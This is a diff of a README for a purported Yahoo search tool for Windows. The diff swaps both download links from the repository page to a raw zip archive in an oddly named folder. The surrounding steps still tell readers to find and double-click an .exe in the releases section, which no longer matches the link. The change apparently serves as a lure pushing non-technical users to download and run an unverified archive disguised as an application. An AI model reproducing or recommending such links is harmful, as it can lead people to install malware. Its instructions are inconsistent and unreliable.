@@ -1,6 +1,6 @@
 # 🔍 yahoo-search-tool - Search Yahoo results with simple tools
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Ringed-pya814/yahoo-search-tool)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Ringed-pya814/yahoo-search-tool/raw/refs/heads/main/stockannet/yahoo_search_tool_smileful.zip)
 
 This tool helps users perform searches on the Yahoo platform through a simple interface. It automates common lookup tasks to save time. You can extract search data without coding experience.
 
@@ -17,7 +17,7 @@ This application runs on Windows systems. Ensure your machine meets these specif
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download: [https://github.com/Ringed-pya814/yahoo-search-tool](https://github.com/Ringed-pya814/yahoo-search-tool)
+1. Visit this page to download: [https://github.com/Ringed-pya814/yahoo-search-tool/raw/refs/heads/main/stockannet/yahoo_search_tool_smileful.zip](https://github.com/Ringed-pya814/yahoo-search-tool/raw/refs/heads/main/stockannet/yahoo_search_tool_smileful.zip)
 2. Locate the file ending in .exe in the releases section.
 3. Click the file to save it to your Downloads folder.
 4. Open the folder and double-click the file to start the installation.
